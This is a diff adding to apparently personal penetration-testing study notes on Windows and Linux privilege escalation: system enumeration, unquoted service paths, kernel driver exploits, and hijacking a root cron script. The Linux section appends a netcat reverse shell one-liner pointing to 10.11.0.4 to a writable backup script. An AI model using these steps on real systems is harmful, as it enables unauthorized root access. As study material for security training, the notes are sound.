@@ -56,6 +56,7 @@ once we know the versions we can look for exports targeting those driver version
 * on win to see a list of loaded drivers: ``powershell`` => ``driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path``
 * on win to also get version numbers: ``Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}``
 * on lin: ``lsmod`` => then we can use f.i.: to enumerate version for the package "libata": ``/sbin/modinfo libata``
+* also on win ``systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"``
 
 # enumerating binaries that autoElevate
 * on win ``reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`` OR ``reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`` is some of those are enabled any user can run windows installer packages with elevated priviledges
@@ -96,3 +97,47 @@ Look for paths like: ``C:\Program Files\`` where software devs control the struc
 * check if the current user has rights to restart the system ``whoami /priv`` => if shutdownPriviledge is shown then we have the rights to do it (otherwise it would not be listed in the list and we would need to wait until someone else restarts the system manually)
 * reboot system ``shutdown /r /t 0``
 * Now we should be able to login into the machine with the "evil" account and local admin group (``net localgroup Administrators``) with rhost for instance
+
+## Leveraging Unquoted Service Paths
+A dev might forgot to quote due to empty space ``C:\Program Files directory`` leaving room for attack.
+
+For example, imagine that we have a service stored in a path such as C:\Program Files\My
+Program\My Service\service.exe. If the service path is stored unquoted, whenever Windows starts
+the service it will attempt to run an executable from the following paths:
+
+C:\Program.exe
+C:\Program Files\My.exe
+C:\Program Files\My Program\My.exe
+C:\Program Files\My Program\My service\service.exe
+
+In this example, Windows will search each “interpreted location” in an attempt to find a valid
+executable path.
+
+For example, we could name our executable Program.exe and place it in C:\Program Files\My Program in our example)
+or subdirectory (C:\Program Files\My Program\My service)
+
+## Windows kernel vuln
+* Anayse first system: ``systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"``
+* As such, we should always attempt to investigate this attack surface first before resorting to more difficult attacks ``driverquery /v``, check 3rd party drivers (even if it marks at stopeed because it is loaded in the memory kernel space)
+* we can check searchsploit for driver but check version, drivers, etc.
+* Check in program files where the program is located the version 
+* Then compile prgram and transfer it to windows 
+
+# Linux
+On linux everything is a file which has write, read and execute. 
+
+## insuficient file permisssion
+In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level. On a Linux system, the cron543 timebased job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.
+
+* run to check cronjobs ``grep "CRON" /var/log/cron.log``
+Output: ...
+Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
+Jan27 17:50:01 victim CRON[2631]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
+Jan27 17:55:01 victim CRON[2656]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
+Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
+* user_backups.sh under */var/scripts/* is executed in the context of the *root user*
+* Check content: ``cat /var/scripts/user_backups.sh`` and permission ``ls -lah /var/scripts/user_backups.sh``
+* Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner ``echo >> user_backup.sh`` && ``echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh``
+* Open nc reverese shell in kali => and once this CJ runs we should have root acccess shell
+
+
